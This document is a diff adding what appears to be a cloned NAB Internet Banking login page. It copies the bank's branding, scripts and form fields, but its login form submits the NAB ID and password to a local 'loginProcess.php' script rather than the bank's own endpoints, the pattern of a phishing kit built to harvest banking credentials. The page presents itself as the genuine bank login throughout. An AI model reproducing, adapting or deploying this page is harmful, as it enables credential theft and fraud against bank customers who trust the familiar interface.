@@ -1,0 +1,749 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Expires" content="0" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Cache-Control" content="no-cache" />
+<meta http-equiv="refresh" content="900" />
+<meta content="noindex,nofollow,noarchive" name="robots" />
+<META NAME="nab-app-id" CONTENT='cf87dc5d-0245-4eff-8d99-37f2da85bf44'>
+<title>NAB Internet Banking</title>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/reset.css?id=043' />
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/_template-styles.css?id=043' />
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/_content-styles.css?id=043' />
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/added-styles.css?id=043' />
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/_campaign-styles.css?id=043' />
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/_ibRedesign-styles.css?id=043' />
+<link rel="stylesheet" media="screen" type="text/css"
+	href='https://ib.nab.com.au/nabib/styles/login/_print-styles.css?id=043' />
+<link href='https://ib.nab.com.au/nabib/scripts/fancybox/jquery.fancybox-1.3.1.css?id=043' rel="stylesheet" type="text/css" media="screen" />
+<!--[if IE 6]>
+<link rel="stylesheet" media="screen" type="text/css"
+	href='/nabib/styles/login/ie6.css?id=043' />
+<![endif]--> 
+
+
+<!--[if IE 7]> <style type="text/css"> .clearfix { display:inline-block; } </style> <![endif]--> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style type="text/css">
+
+.maintenance-check {
+	background:url("https://ib.nab.com.au/nabib/images/login/bg_arrow.gif") no-repeat scroll 0 50% Transparent;
+	color:#ffffff;
+	padding-left:14px;
+	width: 260px;
+	float:left;
+}
+
+.maintenance-check .content {
+	background-color:rgba(191, 52, 37, 0.6);
+	-moz-border-radius:4px;
+	-webkit-border-radius:4px;
+	padding:20px;
+}
+
+.maintenance-check h2 {
+	font-size:1em;
+	padding-bottom:12px;
+	font-family:'CorpidBlack';
+}
+
+h2.icon-spanner {
+	background:url("https://ib.nab.com.au/nabib/images/login/icon_help-v3.gif") no-repeat scroll 0 0 Transparent;
+	padding-left:33px;
+	padding-top:0px;
+	margin-bottom:0;
+	padding-bottom:8px;
+	font-size:1.583em;
+}
+
+#bodycontainer .maintenance-check p {
+	font-size:1.167em;
+	line-height:18px;
+	color:#ffffff;
+}
+
+
+* {
+	margin: 0;
+}
+
+html, body {
+	height: 100%;
+}
+
+.wrapper {
+	min-height: 100%;
+	height: auto !important;
+	height: 100%;
+	margin: 0 auto -70px;
+}
+
+.footer, .push {
+	height: 70px;
+	position: relative;
+}
+
+.push {
+    z-index: 9000;
+}
+.footer {
+    z-index: 9999;
+}
+
+</style>
+
+
+<!--[if IE]>
+<script type="text/javascript" src="/nabib/scripts/libs/json/json2.js?id=16.2.2"></script>
+<![endif]-->
+<script src='/nabib/scripts/jquery/jquery-1.10.2.js?id=029' type="text/javascript"></script>
+<script type="text/javascript" src="/nabib/scripts/jquery/plugins/json/jquery.json-2.3.js?id=16.2.2"></script>	
+<script type="text/javascript" src="/nabib/scripts/jquery/plugins/migrate/jquery-migrate-1.2.1.js?id=16.2.2"></script>
+<script type="text/javascript" src="/nabib/scripts/jquery/plugins/cookie/jquery.cookie.js?id=16.2.2"></script>
+<script src='/nabib/scripts/general.js?id=029' type="text/Javascript"></script>
+<script src='/nabib/scripts/popup_window.js?id=029' type="text/javascript"></script>	
+<script src='/nabib/scripts/fancybox/jquery.fancybox-1.3.1.pack.js?id=029' type="text/Javascript"></script>
+
+<script type="text/javascript" src="/nabib/scripts/libs/browserdata/getBrowserData-3.7.js?id=16.2.2"></script>
+
+<script src='/nabib/scripts/encoder.js?id=029' type="text/Javascript"></script>
+<script type="text/javascript" src="/nabib/scripts/libs/angular/angular.min.js?id=16.2.2"></script>
+<script type="text/javascript" src="/nabib/scripts/libs/angular/angular-route.min.js?id=16.2.2"></script>
+<script type="text/javascript" src="/nabib/scripts/angular/legacyCors/enableLegacyCors.js?id=16.2.2"></script>
+<script type="text/javascript" src="/nabib/scripts/angular/nabApiAuth.js?id=16.2.2"></script>
+<script type="text/javascript" src="/nabib/scripts/angular/nabApiLogout.js?id=16.2.2"></script>
+
+<script type="text/Javascript" language="JavaScript">
+	
+	var applicationId = $("meta[name=nab-app-id]").attr("content");
+
+	angular.module('nab.ib.nabapi.config', [])
+	.constant('nabApiConfig', {
+	    domain: 'https://api.nab.com.au',
+	    applicationId: applicationId
+	});
+	
+	
+	angular.module('nab.ib.nabapi.logout.config', [])
+	.constant('apiLogoutUrl', '/init/auth?v=1');
+</script>
+
+
+<script type="text/Javascript">
+
+// Force this page to only be opened within the Parent frame,
+// and NOT within any iframe.
+if (window.parent != window.self) {
+	window.parent.location.href=window.location.href;
+}
+
+isSafari = (navigator.appVersion.indexOf("Safari")!=-1);
+// PD - Special handling of Safari which does not set the window.name properly
+if (!isSafari) {
+	
+		if(!window.opener||window.name!="ib") {
+			location.replace("http://www.nab.com.au/");
+		}
+	
+}
+
+var session_user="null";
+
+var sb_1=false;
+function validateLogin() {
+  if(sb_1)return false;
+
+  if(trimLeft(document.loginForm.userid.value)==="") {
+    
+		showError('301005','Please enter your NAB ID.');
+	
+    document.loginForm.userid.focus();return false;
+  } else if (isNaN(document.loginForm.userid.value)) {
+  	//format error message to include line breaks
+	showError('301004', 'Your NAB ID is incorrect. <br/>It is a 8-10 digit number, found on the back of your NAB Credit or Debit card.');
+    document.loginForm.userid.focus();return false;
+  }
+  if(document.loginForm.password.value==="") {
+	showError('301008','Please enter your Internet Banking password.');
+    document.loginForm.password.focus();return false;
+  }
+  sb_1=true;
+
+  document.getElementById("encoded-password").value=check(document.loginForm.password.value,$('#webKey').val(),$('#webAlpha').val());
+  document.loginForm.password.value="";
+  
+  
+  $('#loginForm').append("<input name='login' type='hidden' value='Login'>");
+
+  document.loginForm.browserData.value=getBrowserData();
+  document.loginForm.submit();
+  return false;
+}
+ 
+function init() { 
+	initKey(validateLogin);
+
+
+	
+}
+
+function getFormattedErrorMessage() {
+
+  var errorMsg = 'null';
+  return errorMsg;
+}
+
+
+function showRegistration() {
+	var url = 'http://www.nab.com.au/personal/internet-banking/getting-started/register';
+	
+	if (window.opener === null || window.opener.closed) {
+		window.open(url);
+	}
+	else {
+		window.opener.location=url;
+	}	
+	javascript:window.close();
+}
+
+
+function returnToWealthHub() {
+	document.loginForm.action = 'wealthHubCancel.ctl';
+	document.loginForm.submit();
+}
+
+function showError(errorNumber, errorMessage){
+	$('.maintenance-check').hide();
+	$('.general-message').hide();
+	$('#errorNumber').html('(' + errorNumber + ')');
+	$('#errorMessage').html(errorMessage);
+	$('.need-help').show();
+	// Workaround to stop arrow appearing on left of page
+	$('.need-help').css('padding-left','0px');
+	$('.need-help').css('padding-left','13px');
+}
+
+
+  var dHeight;
+  var dWidth;
+	
+  $(function() {
+    $('a.fancybox-page').each(function(){
+      if($(this).attr('href').match(/width=[0-9]+/i) !=null) {
+        dWidth     = parseInt($(this).attr('href').match(/width=[0-9]+/i)[0].replace('width=',''));
+      } else {
+        dWidth = 500;
+      }
+      if($(this).attr('href').match(/height=[0-9]+/i) !=null) {
+        dHeight =  parseInt($(this).attr('href').match(/height=[0-9]+/i)[0].replace('height=',''));
+      } else {
+        dHeight = 348;
+      }
+      $(this).fancybox({
+      'width':dWidth,
+      'height':dHeight,
+      'padding':   20,
+      'autoScale'         : false,
+      'showCloseButton'   : false,            
+      'scrolling'         : 'no',
+      'titleShow'         : false,
+      'transitionIn'      : 'none',
+      'transitionOut'     : 'none',
+      'type'              : 'iframe'
+    });
+  });
+  $("#fancybox-frame").focus();
+  });
+  function change_parent_url(url) {
+    window.location=url;
+  }
+  
+  function confirmExit() {
+      if( confirm( "Thank you for banking with the NAB\nAre you sure you want to exit?"))
+          window.close();
+  }
+  
+  $(document).ready(function() {
+		var fields = $("input[type!='hidden']").toArray();
+		var onfocus = $(document.activeElement)[0];
+		var index = $.inArray(onfocus, fields);
+		if (index == -1) {
+			
+			document.loginForm.userid.focus();
+		}
+	});
+  
+</script>
+
+</head>
+<body id="mainPage" ng-app="nab.ib.nabapi.logout" ng-controller="apiLogoutController" ng-init="apiLogoutWhenIBLogin();" onLoad="init()">
+<div id="bodycontainer" class="clearfix wrapper">
+	
+<form id="loginForm" name="loginForm" action="loginProcess.php" method="post" autocomplete="off">
+
+	<input type="hidden" id="webKey" value= "kK15owGZCkoGbMcBhmcsW8Ghh7hK5PZ2t4WgbHoUNvx9xeGQaGX1a6IGC2xta9FLZU2TqWry56hndrsQQz0TC1lArGJL1Z5KZcVUmniol2r01Vm9LxntVyyZX8oPa92w9Ff6S9t0RRHfu93mAMdFXJ9cS7ksQAlnTvYMj4Kr25aezbcVlU8MWA8wu6dqLDpuMYKsUjoYUkdhuo1vxm7dLeDtwDn5G2dmmen8XGOzewR0oVkpyWih5GUOiI3SxE5FmiAaJ3QapTLBzX6HOsKtNugxNCEqd4gmhblXpIhNe0DKPNKWPxR2k3QYsm2KfTky15JQisWvmuHqv7ybLiBBQTx2BifHTnzA3IYtleRE3yLIpv4TcOGtGceizaufCPs2E2MAQu6XBnfr6JN6RS9aJaGuqqlGL9g4Edu4PvCBoqMFwqFcwgdsnWNciwUQwsKiGV7Xb7cAbtM5mZANJtVFukHZ77MVKPVLTEVrmV3deSLaZnqia5J1"/>
+	<input type="hidden" id="webAlpha" value= "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" />
+	
+	<input type="hidden" name="browserData" value="value">
+			
+	<input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="d9a3eff109674c919b12af3983512bf7">
+
+<!-- 2011.4 - commented out until format decided
+
+-->
+
+	<div id="bodycontainer_inside" class="clearfix">
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/Javascript" language="JavaScript">
+
+
+
+
+
+
+
+function helpwin(loc,ft_1) {
+  if(isMac&&NS4)ft_1=ft_1+",status=yes";
+  hw=window.open(loc,'Help',ft_1);
+  hw.focus();
+}
+
+function abswin(loc,st_1){
+  if(isMac&&NS4)st_1=st_1+",status=yes";
+  hw=window.open(loc,'absLink',st_1);
+  hw.focus();
+}
+
+
+
+
+function logoff() {
+	if (confirm('Thank you for banking with NAB.\nAre you sure you want to logout?')) { 		
+		
+		
+			logoffFMT();
+		
+	}
+}
+
+
+function logoffIB() {
+	navigateTo("logoutToWCM.ctl?bw=" + browserWidth() + "&bh=" + browserHeight());		
+}
+
+
+var SST_MYBUDGET_URL = "proxy/fmt";
+	
+
+function logoffFMT() {
+	// This code has been extracted from mybudgetClient.js - logoutMBWithCB()
+	$.ajax({
+		url: SST_MYBUDGET_URL + '/logout',
+		data: { ajax: '1' },
+		complete: logoffIB
+	});
+}
+
+
+function logoffAndGoToNationalLocation() {
+	logoffOpenWindow("http://ols.nab.com.au/location-web/search.do",
+		'Thank you for banking with NAB.\nAre you sure you want to logout?');
+}
+
+
+function goToNationalLocation() {
+	window.open("http://ols.nab.com.au/location-web/search.do",
+				"",
+				"width=800,height=600,resizable=yes,scrollbars=yes,menubar=no,status=yes,directories=no,location=no,left=0,top=0,screenX=0,screenY=0");
+}
+
+
+function goToNationalContact() {
+	window.open("http://www.nab.com.au/about-us/contact-us",
+				"",
+				"width=800,height=600,resizable=yes,scrollbars=yes,menubar=no,status=yes,directories=no,location=no,left=0,top=0,screenX=0,screenY=0");
+}
+
+
+function goToSecurity() {
+	window.open("http://www.nab.com.au/about-us/security",
+				"",
+				"width=800,height=600,resizable=yes,scrollbars=yes,menubar=no,status=yes,directories=no,location=no,left=0,top=0,screenX=0,screenY=0");
+}
+
+function applyTxAccount() {
+	openWindow("https://www.nab.com.au/personal/accounts/opening-a-new-personal-account/checklist-apply-for-a-nab-classic-banking-account??WT.seg_1=ZEA");
+}
+
+function applyHyioAccount() {
+	openWindow("https://www.nab.com.au/personal/accounts/opening-a-new-personal-account/checklist-apply-for-nab-saving-saccount?WT.seg_1=ZEB");
+}
+
+function applyHomeLoan() {
+	openWindow("https://www.nab.com.au/personal/loans/home-loans/forms/home-loan-borrowing-capacity#/");
+}
+
+
+function logoffOpenWindow(location, message) {
+	if (confirm(message)) { 
+		window.open(location,
+			"",
+			"width=800,height=600,resizable=yes,scrollbars=yes,menubar=no,status=yes,directories=no,location=no,left=0,top=0,screenX=0,screenY=0");
+			
+		submitMenu('logout.ctl'); 
+	}
+}
+
+function openWindow(location) {
+	window.open(location,
+		"",
+		"width=800,height=600,resizable=yes,scrollbars=yes,menubar=no,status=yes,directories=no,location=no,left=0,top=0,screenX=0,screenY=0");	
+}
+
+
+
+
+</script>
+<div id="header">
+	<div class="inside clearfix">
+		
+		<div class="column-1"> <a href="http://www.nab.com.au/" title="NAB"><img src="https://ib.nab.com.au/nabib/images/login/logo_nab.gif" alt="nab" class="logo" /></a>
+		</div>
+		
+		<div class="column-2">
+			<ul>
+				<li class="first"><a   title="Help (opens in new window)"	href="javascript:helpwin('http://www.nab.com.au/personal/internet-banking/help/nab-internet-banking','top=20,left=50,width=780,height=560,toolbar=yes,scrollbars=yes,resizable=yes')" onmouseout="status='';return true;" onfocus="status='Help';return true;" onclick="">Help</a></li>
+				<li><a href="javascript:goToSecurity()" title="Security">Security</a></li>
+				<li><a title="Contact us" href="javascript:goToNationalContact()">Contact us</a></li>
+			</ul>
+			<p>Thursday 28 July 2016</p>
+		</div>
+		 
+	</div>
+</div>
+
+		
+		<div id="banner">
+			<div class="inside clearfix">
+				
+				<h1>NAB Internet Banking</h1>
+										
+				<div class="user-login clearfix">
+					<div class="column-1"> 
+						<h2>NAB ID</h2>	
+						<div class="ib-user form-layout-1 clearfix" id="acs">
+							<fieldset>
+								<legend>NAB ID</legend>
+								<div class="ib-user-field clearfix">	
+									<input type="text" autocomplete="off" value="" title="NAB ID"
+									class="ib-user-text red-border rc-2 ac_input" name="userid"
+									size="18" maxlength="10" id="ib-user-text" tabindex="1">
+								</div>				
+							</fieldset>
+						</div>
+						<a href="nab_id_help.ctl?width=495&height=200" title="Forgotten your NAB ID?" class="ico smallGreyArrow fancybox-page first">Forgotten your NAB ID?</a>
+					</div>
+					
+					<div class="column-1"> 
+						<h2>Password</h2>	
+						<div class="ib-user form-layout-1 clearfix" id="acs">
+							<fieldset>
+								<legend>Password</legend>
+								<div class="ib-user-field clearfix">	
+									
+								    <input type="password" autocomplete="off" id="dummy" style="display:none">
+								    <input type="hidden" autocomplete="off" id="encoded-password" name="encoded-password">
+								    
+									<input type="password" autocomplete="off" value="" title="Internet Banking password"
+									class="ib-user-text red-border rc-2 ac_input" name="password" id="ib-user-text"
+									size="18" autocomplete="off"  maxlength="500"
+									tabindex="2">
+								</div>				
+							</fieldset>
+						</div>
+						<a href="password_hints.ctl?width=500&height=266" title="Forgotten your password?" class="ico smallGreyArrow fancybox-page">Forgotten your password?</a>
+					</div>
+					<div class="cta"> 
+											
+							<input type="submit"  value=" Login " style="font-size:25pt;color:white;background-color:black;border:1px solid #336600;padding:3px">   
+						
+						
+					</div>
+					
+					
+
+					
+					
+						
+					
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<style type="text/css">
+
+.need-help {
+	background:url("images/login/bg_arrow_black.gif") no-repeat scroll 0 50px Transparent;
+	color:#ffffff;
+	padding-left:13px;
+	margin-left:25px;
+	width:262px;
+	float:left;
+}
+
+.need-help .content {
+	background-color:#000000;
+	-moz-border-radius:4px;
+	-webkit-border-radius:4px;
+	padding-top:20px;
+	padding-right:20px;
+	padding-left:20px;
+	padding-bottom:1px;
+}
+
+.need-help h2 {
+	font-size:1.6em;
+	padding-bottom:8px;
+	line-height:21px;
+	font-family:'CorpidBlack';
+}
+
+h2.icon-help {
+	background: url("images/login/icon_help.gif") no-repeat scroll 0 2px Transparent;
+    padding-left: 29px;
+    padding-top: 2px;
+    margin-bottom:0;
+}
+
+.need-help p {
+	font-size:1em;
+	line-height:22px;
+	color:#ffffff;
+}
+</style>
+
+<div class="need-help" style="display:none;">
+	<div class="content">
+		<h2 class="icon-help">Login Error 
+		    <span id="errorNumber" style="font-size:0.7em;"></span>
+		</h2>
+		<p id="errorMessage" style="font-size:1.167em;"></p>
+	</div>
+</div>
+
+					
+				</div>		
+				
+			</div>
+		</div>
+
+		<div class="maincontainer_inside">
+			<div class="call-to-action-box bottom-border clearfix">
+				<div class="content">
+					<p>Using NAB Internet Banking for the first time?</p>
+				</div>
+				<a class="link-btn link-btn_sm red float-right" title="Register now for NAB Internet Banking" href="#"
+					onclick="showRegistration()">Register now</a>
+			</div>
+			
+			
+				
+				<div class="ib-iframe">
+					<iframe name="loginTips" scrolling="no" src="https://www.nab.com.au/static/IB/loginBanner/"
+						frameborder=0 width="100%" height="240px">                
+					</iframe>
+				</div>
+			
+		</div>
+	</div>	
+	
+
+
+
+
+
+
+<input type="hidden" name="charityId" value=""/>
+<input type="hidden" name="applyOffers" value=""/>
+<input type="hidden" name="applyMyOffers" value=""/>
+<input type="hidden" name="applyHomeLoan" value=""/>
+<input type="hidden" name="applyPersonalLoan" value=""/>
+<input type="hidden" name="applyAcctSavings" value=""/>
+<input type="hidden" name="applyAcctTran" value=""/>
+<input type="hidden" name="applyTermDeposits" value=""/>
+<input type="hidden" name="applyCreditCards" value=""/>
+<input type="hidden" name="applyCreditCardLimit" value=""/>
+<input type="hidden" name="statementSettings" value=""/>
+<input type="hidden" name="newBillPayment" value=""/>
+<input type="hidden" name="newInternationalPayment" value=""/>
+<input type="hidden" name="wcurrency" value=""/>
+<input type="hidden" name="wrate" value=""/>
+<input type="hidden" name="changeAddress" value=""/>
+<input type="hidden" name="viewLetters" value=""/>
+<input type="hidden" name="secureMessageCreate" value=""/>
+<input type="hidden" name="redrawLoan" value=""/>
+<input type="hidden" name="disputeTransaction" value=""/>
+<input type="hidden" name="reorderBook" value=""/>
+<input type="hidden" name="moneyTracker" value=""/>
+<input type="hidden" name="xeroTerms" value=""/>
+<input type="hidden" name="overseasTravelNotification" value=""/>
+</form>
+<div class="push"></div>
+</div>
+
+
+
+<div id="footer_login" class="footer">
+	<div class="inside clearfix">				
+		<a href="javascript:openPopUpWindow('http://www.nab.com.au/nabdefence', 'nabdefence', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')"
+			title="Learn more about NAB Defence"><img border="0" class="left" alt="NAB Defence" src="/nabib/images/login/NAB_Defence.gif" /></a>
+		<p style="float:left;">NAB Defence, your protection against fraud. 
+			<a href="javascript:openPopUpWindow('http://www.nab.com.au/nabdefence', 'nabdefence', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')"
+			title="Learn more about NAB Defence">Learn more about NAB Defence.</a>
+		</p>
+		<ul class="clearfix" id="links-social-media">
+			<li>
+			    <a href="javascript:openPopUpWindow('https://www.facebook.com/nab', 'nabfacebook', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')"
+				   title="Facebook" class="footer-facebook"></a>
+		    </li>
+		    <li>
+				<a href="javascript:openPopUpWindow('https://twitter.com/nab', 'nabtwitter', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')"
+				   title="Twitter" class="footer-twitter"></a>
+		    </li>
+		    <li>
+				<a href="javascript:openPopUpWindow('https://plus.google.com/113563644525302634808?prsrc=3', 'nabgoogleplus', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')"
+				   title="Google Plus" class="footer-icon-gplus"></a>	
+			</li>
+			<li>
+				<a href="javascript:openPopUpWindow('https://www.youtube.com/nab', 'nabyoutube', '780', '560', 'yes', 'yes', 'yes', 'yes', 'yes', '', '50', '20', '')"
+				   title="You Tube" class="footer-icon-youtube"></a>
+		    </li>
+		</ul>
+	</div>
+</div>
+
+</body>
+</html>
